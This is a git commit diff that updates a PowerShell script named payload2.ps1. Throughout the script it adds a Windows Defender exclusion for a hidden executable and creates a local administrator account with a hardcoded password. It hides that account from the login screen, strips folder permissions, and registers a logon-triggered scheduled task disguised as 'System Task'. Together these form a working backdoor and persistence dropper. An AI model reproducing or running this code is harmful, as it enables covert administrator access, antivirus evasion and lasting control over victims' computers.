6af31a3aa349e36095c594d5e9148242d8f10992
milujemnastenky <nastenkaferi@proton.me>
2025-04-04 15:32:03 +0200

    Update payload2.ps1

--- apps/payload2.ps1
+++ apps/payload2.ps1
@@ -1,7 +1,5 @@
 New-Item -ItemType Directory -Path C:\Users\Public\krnl
 
-Register-ScheduledTask -TaskName "WINschvostkrnl" -Action (New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c schvostkrnl-debug.exe > log.txt 2>&1" -WorkingDirectory "C:\Users\Public\krnl") -Trigger (New-ScheduledTaskTrigger -AtLogon) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -ExecutionTimeLimit 0 -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 5) -TaskPath "\" -Description "System Task" -Force
-
 Add-MpPreference -ExclusionPath "C:\Users\Public\krnl\schvostkrnl-debug.exe"
 
 
@@ -16,10 +14,20 @@ Set-ItemProperty -Path "C:\Users\Public\krnl\schvostkrnl-debug.exe" -Name Creati
 Set-ItemProperty -Path "C:\Users\Public\krnl" -Name Attributes -Value Hidden
 
 
-net user krnlrunner "StrongPassword123!" /add & net localgroup Administrators krnlrunner /add & reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v krnlrunner /t REG_DWORD /d 0 /f
+net user krnlrunner "StrongPassword123!" /add
+net localgroup Administrators krnlrunner /add
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v krnlrunner /t REG_DWORD /d 0 /f
 
-icacls "C:\Users\Public\krnl" /inheritance:r & icacls "C:\Users\Public\krnl" /remove "Users" & icacls "C:\Users\Public\krnl" /remove "Everyone" & icacls "C:\Users\Public\krnl" /grant:r "krnlrunner:(OI)(CI)F" "SYSTEM:(OI)(CI)F"
+icacls "C:\Users\Public\krnl" /inheritance:r
+icacls "C:\Users\Public\krnl" /remove "Users"
+icacls "C:\Users\Public\krnl" /remove "Everyone"
+icacls "C:\Users\Public\krnl" /grant:r "krnlrunner:(OI)(CI)F" "SYSTEM:(OI)(CI)F"
 
-runas /user:krnlrunner cmd
+Start-Process "cmd.exe" -Credential (New-Object System.Management.Automation.PSCredential("krnlrunner", (ConvertTo-SecureString "StrongPassword123!" -AsPlainText -Force))) -ArgumentList "/c exit"
 
-Register-ScheduledTask -TaskName "WINschvostkrnl" -Action (New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start schvostkrnl-debug.exe" -WorkingDirectory "C:\Users\Public\krnl") -Trigger (New-ScheduledTaskTrigger -AtLogon) -Principal (New-ScheduledTaskPrincipal -UserId "krnlrunner" -LogonType Password -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -ExecutionTimeLimit 0 -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 5) -TaskPath "\" -Description "System Task" -Force
+Register-ScheduledTask -TaskName "WINschvostkrnl" `
+  -Action (New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start schvostkrnl-debug.exe" -WorkingDirectory "C:\Users\Public\krnl") `
+  -Trigger (New-ScheduledTaskTrigger -AtLogon) `
+  -Principal (New-ScheduledTaskPrincipal -UserId "krnlrunner" -LogonType Password -RunLevel Highest) `
+  -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -ExecutionTimeLimit 0 -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 5) `
+  -Description "System Task" -Force
